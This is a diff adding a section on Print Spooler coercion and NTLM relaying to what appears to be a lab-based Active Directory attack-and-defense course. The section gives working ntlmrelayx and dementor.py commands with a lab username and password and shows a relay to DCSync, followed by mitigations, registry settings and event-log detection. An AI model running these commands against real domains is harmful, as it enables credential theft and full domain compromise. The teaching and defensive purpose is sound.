@@ -42,8 +42,9 @@ This module covers **Active Directory attacks and defense** - common attack tech
 9. [DCSync](#9-dcsync)
 10. [Golden Ticket](#10-golden-ticket)
 11. [Kerberos Constrained Delegation](#11-kerberos-constrained-delegation)
-12. [Interview Questions](#12-interview-questions)
-13. [Additional Resources](#13-additional-resources)
+12. [Print Spooler & NTLM Relaying](#12-print-spooler--ntlm-relaying)
+13. [Interview Questions](#13-interview-questions)
+14. [Additional Resources](#14-additional-resources)
 
 ---
 
@@ -1614,7 +1615,121 @@ eagle\administrator
 
 ---
 
-## 12. Interview Questions
+## 12. Print Spooler & NTLM Relaying
+
+### Description
+
+> 📌 **Print Spooler** - old Windows service (enabled by default) that can be abused to coerce authentication.
+
+```mermaid
+graph LR
+    Attacker[Attacker] -->|Trigger<br/>PrinterBug| DC[Domain Controller]
+    DC -->|Reverse<br/>connection with TGT| Attacker
+    Attacker -->|Relay to| DCSync[ DCSync]
+    Attacker -->|Or| Cert[Certificate Services]
+    Attacker -->|Or| UD[Unconstrained Delegation]
+    
+    style Attacker fill:#ff9999,stroke:#333
+    style DC fill:#ffcccc,stroke:#333
+```
+
+**Attack Vectors:**
+1. Relay to another DC (DCSync) - if SMB Signing disabled
+2. Force DC to connect to Unconstrained Delegation server
+3. Relay to AD Certificate Services
+4. Configure Resource-Based Kerberos Delegation
+
+> 🔴 Microsoft's stance: "by-design" - will not fix!
+
+### Attack
+
+**Step 1: Start NTLMRelayx:**
+
+```bash
+impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
+```
+
+**Output:**
+
+```
+[*] Protocol Client DCSYNC loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Servers started, waiting for connections
+```
+
+<img width="1034" height="731" alt="image" src="https://github.com/user-attachments/assets/775d6570-57e2-4d88-8ac7-08d2de080d85" />
+
+**Step 2: Trigger PrinterBug:**
+
+```bash
+python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
+```
+
+**Output:**
+
+```
+[*] connecting to 172.16.18.3
+[*] bound to spoolss
+[*] getting context handle...
+[*] sending RFFPCNEX...
+```
+
+<img width="879" height="152" alt="image" src="https://github.com/user-attachments/assets/925a3595-796f-4d25-9319-5e4415448c7a" />
+
+**Step 3: DCSync successful:**
+
+<img width="1834" height="927" alt="image" src="https://github.com/user-attachments/assets/673fc4ed-ebf1-44d7-9315-5d8d04a4e890" />
+
+> 💡 Requires SMB Signing disabled on Domain Controllers
+
+### Prevention
+
+| Mitigation | Description |
+|-----------|-------------|
+| **Disable Print Spooler** | Disable on non-print servers |
+| **Disable on DCs** | Never run on Domain Controllers |
+| **Registry Key** | Set RegisterSpoolerRemoteRpcEndPoint = 2 |
+| **Enable SMB Signing** | Prevents relaying |
+
+**Registry Configuration:**
+
+```
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers
+RegisterSpoolerRemoteRpcEndPoint = 1 (enable) or 2 (disable)
+```
+
+<img width="1877" height="503" alt="image" src="https://github.com/user-attachments/assets/22bd6616-3df6-47f7-9afd-de333a8cb0c3" />
+
+### Detection
+
+**Challenge:** Generic network connections - hard to detect
+
+**Key Indicator:**
+- Event 4624 shows DC1$ logon from unexpected IP (Kali machine)
+- Not from actual Domain Controller IP
+
+**Event 4624 - DC logon from attacker IP:**
+
+<img width="1276" height="1295" alt="image" src="https://github.com/user-attachments/assets/0d46b928-d90a-459d-bd4b-10404f9be7c8" />
+
+**Detection Strategy:**
+- Correlate logon attempts from DCs to known IP addresses
+- DCs should only logon from their static IPs
+
+### Honeypot Approach
+
+**Firewall Rules:**
+- Block outbound connections to ports 139 and 445
+- This allows PrinterBug to trigger but blocks reverse connection
+- Blocked connections = signs of compromise
+
+> ⚠️ **Caution:** Keep ports open between DCs for replication!
+
+---
+
+## 13. Interview Questions
 
 ### Q1: What is Kerberoasting and how does it work?
 
@@ -1792,7 +1907,7 @@ Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} |
 
 ---
 
-## 13. Additional Resources
+## 14. Additional Resources
 
 ### Tools
 
